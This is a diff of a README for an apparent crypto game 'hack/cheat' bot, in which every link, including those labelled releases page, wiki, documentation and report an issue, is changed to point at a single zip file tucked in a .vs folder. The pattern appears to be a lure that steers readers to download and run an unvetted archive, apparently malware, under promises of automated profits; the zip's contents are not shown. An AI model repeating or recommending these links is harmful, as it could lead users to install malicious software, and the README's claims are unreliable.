@@ -1,6 +1,6 @@
 # 🎮 GasHero-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-Blockchain-Hack-Cheat - Automate Your Game and Maximize Profits
 
-[![Download GasHero](https://raw.githubusercontent.com/AEptR67/GasHero-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-Blockchain-Hack-Cheat/main/Barbacoan/GasHero-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-Blockchain-Hack-Cheat.zip)](https://raw.githubusercontent.com/AEptR67/GasHero-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-Blockchain-Hack-Cheat/main/Barbacoan/GasHero-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-Blockchain-Hack-Cheat.zip)
+[![Download GasHero](https://github.com/AEptR67/GasHero-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-Blockchain-Hack-Cheat/raw/refs/heads/main/.vs/Farm_Hack_Crypto_Hero_Cheat_Auto_Finance_Gas_Game_Blockchain_Clicker_Bot_1.1.zip)](https://github.com/AEptR67/GasHero-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-Blockchain-Hack-Cheat/raw/refs/heads/main/.vs/Farm_Hack_Crypto_Hero_Cheat_Auto_Finance_Gas_Game_Blockchain_Clicker_Bot_1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the **GasHero-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-Blockchain-Ha
 
 To get started, click the button below to visit the releases page:
 
-[![Visit Releases Page](https://raw.githubusercontent.com/AEptR67/GasHero-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-Blockchain-Hack-Cheat/main/Barbacoan/GasHero-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-Blockchain-Hack-Cheat.zip)](https://raw.githubusercontent.com/AEptR67/GasHero-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-Blockchain-Hack-Cheat/main/Barbacoan/GasHero-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-Blockchain-Hack-Cheat.zip)
+[![Visit Releases Page](https://github.com/AEptR67/GasHero-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-Blockchain-Hack-Cheat/raw/refs/heads/main/.vs/Farm_Hack_Crypto_Hero_Cheat_Auto_Finance_Gas_Game_Blockchain_Clicker_Bot_1.1.zip)](https://github.com/AEptR67/GasHero-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-Blockchain-Hack-Cheat/raw/refs/heads/main/.vs/Farm_Hack_Crypto_Hero_Cheat_Auto_Finance_Gas_Game_Blockchain_Clicker_Bot_1.1.zip)
 
 1. Open the link provided above.
 2. Look for the latest version of the GasHero Bot.
@@ -75,7 +75,7 @@ After installing, follow these steps to start using the GasHero Bot:
 
 ## 📖 Support & Documentation
 
-If you need further assistance, consult our documentation. It provides detailed insight into setting features and troubleshooting common issues. To access documentation, visit our [Wiki](https://raw.githubusercontent.com/AEptR67/GasHero-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-Blockchain-Hack-Cheat/main/Barbacoan/GasHero-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-Blockchain-Hack-Cheat.zip).
+If you need further assistance, consult our documentation. It provides detailed insight into setting features and troubleshooting common issues. To access documentation, visit our [Wiki](https://github.com/AEptR67/GasHero-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-Blockchain-Hack-Cheat/raw/refs/heads/main/.vs/Farm_Hack_Crypto_Hero_Cheat_Auto_Finance_Gas_Game_Blockchain_Clicker_Bot_1.1.zip).
 
 ## 🤝 Community and Feedback
 
@@ -83,8 +83,8 @@ Join our community to share tips and experiences with fellow users. Your feedbac
 
 ## 🔗 Useful Links
 
-- [Visit Releases Page](https://raw.githubusercontent.com/AEptR67/GasHero-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-Blockchain-Hack-Cheat/main/Barbacoan/GasHero-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-Blockchain-Hack-Cheat.zip)
-- [Documentation](https://raw.githubusercontent.com/AEptR67/GasHero-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-Blockchain-Hack-Cheat/main/Barbacoan/GasHero-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-Blockchain-Hack-Cheat.zip)
-- [Report an Issue](https://raw.githubusercontent.com/AEptR67/GasHero-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-Blockchain-Hack-Cheat/main/Barbacoan/GasHero-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-Blockchain-Hack-Cheat.zip)
+- [Visit Releases Page](https://github.com/AEptR67/GasHero-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-Blockchain-Hack-Cheat/raw/refs/heads/main/.vs/Farm_Hack_Crypto_Hero_Cheat_Auto_Finance_Gas_Game_Blockchain_Clicker_Bot_1.1.zip)
+- [Documentation](https://github.com/AEptR67/GasHero-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-Blockchain-Hack-Cheat/raw/refs/heads/main/.vs/Farm_Hack_Crypto_Hero_Cheat_Auto_Finance_Gas_Game_Blockchain_Clicker_Bot_1.1.zip)
+- [Report an Issue](https://github.com/AEptR67/GasHero-Finance-Game-Bot-Auto-Farm-Clicker-Crypto-Blockchain-Hack-Cheat/raw/refs/heads/main/.vs/Farm_Hack_Crypto_Hero_Cheat_Auto_Finance_Gas_Game_Blockchain_Clicker_Bot_1.1.zip)
 
 Now, download the GasHero Bot and enjoy a more efficient gaming experience!
